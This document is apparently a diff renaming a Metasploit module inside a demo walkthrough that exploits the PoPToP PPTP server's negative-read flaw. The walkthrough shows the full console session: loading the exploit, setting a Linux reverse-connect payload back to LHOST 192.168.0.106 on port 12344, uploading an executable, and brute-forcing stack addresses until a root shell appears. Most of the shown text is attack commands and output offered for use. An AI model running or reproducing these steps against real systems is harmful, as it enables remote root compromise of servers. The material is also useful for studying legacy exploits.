@@ -14,11 +14,11 @@ LHOST -> 192.168.0.106
 
 3) Load up your exploit module
 
-msf > use PoPToP_Negative_Read 
+msf > use poptop_negative_read 
 
 4) Show available payloads
 
-msf PoPToP_Negative_Read > show payloads 
+msf poptop_negative_read > show payloads 
 
 Metasploit Framework Usable Payloads
 ====================================
@@ -32,12 +32,12 @@ Metasploit Framework Usable Payloads
 
 5) Pick our payload (impurity reverse connect)
 
-msf PoPToP_Negative_Read > set PAYLOAD linx86reverse_imp
+msf poptop_negative_read > set PAYLOAD linx86reverse_imp
 PAYLOAD -> linx86reverse_imp
 
 6) Show the exploit and payload options (You can see defaults already filled in)
 
-msf PoPToP_Negative_Read > show options 
+msf poptop_negative_read > show options 
 
 Exploit and Payload Options
 ===========================
@@ -56,17 +56,17 @@ Exploit and Payload Options
 
 7) Set the impurity executable to upload/execute
 
-msf PoPToP_Negative_Read > set PEXEC ./impurity/shelldemo
+msf poptop_negative_read > set PEXEC ./impurity/shelldemo
 PEXEC -> ./impurity/shelldemo
 
 8) Set the local port to connect back to (handler binds and listens, its magic)
 
-msf PoPToP_Negative_Read > set LPORT 12344
+msf poptop_negative_read > set LPORT 12344
 LPORT -> 12344
 
 9) Show exploit and payload advanced options
 
-msf PoPToP_Negative_Read > show advanced 
+msf poptop_negative_read > show advanced 
 
 Exploit and Payload Advanced Options
 ====================================
@@ -74,7 +74,7 @@ Exploit and Payload Advanced Options
   Payload (Msf::Payload::linx86_reverse_impurity):
   ------------------------------------------------
 
-  Exploit (Msf::Exploit::PoPToP_Negative_Read):
+  Exploit (Msf::Exploit::poptop_negative_read):
   ---------------------------------------------
   Name:     ExtraSpace
   Default:  0
@@ -130,12 +130,12 @@ Exploit and Payload Advanced Options
 10) Set ExtraSpace, giving us the ability to use bigger payloads and making the
     brute force go faster (bigger nop sled, bigger StackStep)
 
-msf PoPToP_Negative_Read > set ExtraSpace 128
+msf poptop_negative_read > set ExtraSpace 128
 ExtraSpace -> 128
 
 11) Lets rock it yo
 
-msf PoPToP_Negative_Read > exploit
+msf poptop_negative_read > exploit
 Trying 0xbffffa00
 Trying 0xbffff948
 Trying 0xbffff890
@@ -171,6 +171,6 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 impurity demo > quit
 [*] Exiting Shell Listener...
 
-msf PoPToP_Negative_Read > quit
+msf poptop_negative_read > quit
 
 12) How cool was that? Enjoy. -spn
